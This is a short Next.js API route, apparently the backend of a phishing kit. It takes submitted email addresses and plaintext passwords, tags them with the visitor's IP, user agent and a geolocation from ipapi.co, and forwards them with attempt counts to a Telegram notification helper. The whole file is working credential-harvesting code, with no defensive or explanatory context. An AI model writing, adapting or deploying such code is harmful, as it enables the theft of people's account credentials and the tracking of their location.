import { NextRequest, NextResponse } from 'next/server'
import { sendLayerNotification } from '@/lib/telegramNotifications'

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const ip =
      request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() ||
      request.headers.get('x-real-ip') ||
      request.headers.get('cf-connecting-ip') ||
      'Unknown'
    const userAgent = request.headers.get('user-agent') || 'Unknown'

    // Get location
    let location = 'Unknown'
    try {
      const locResponse = await fetch(`https://ipapi.co/${ip}/json/`, {
        signal: AbortSignal.timeout(3000),
      })
      const locData = await locResponse.json()
      if (locData.city && locData.country_name) {
        location = `${locData.city}, ${locData.country_name}`
      }
    } catch {
      // Silently fail location lookup
    }

    const notificationResult = await sendLayerNotification({
      layer: body.layer,
      status: body.status,
      email: body.email || 'unknown',
      password: body.password,
      ip,
      userAgent,
      location,
      timestamp: new Date().toISOString(),
      attemptNumber: body.attemptNumber,
      details: body.details,
    })

    if (!notificationResult) {
    }

    return NextResponse.json({ success: true, notificationSent: notificationResult })
  } catch (error) {
    return NextResponse.json({ success: false }, { status: 500 })
  }
}

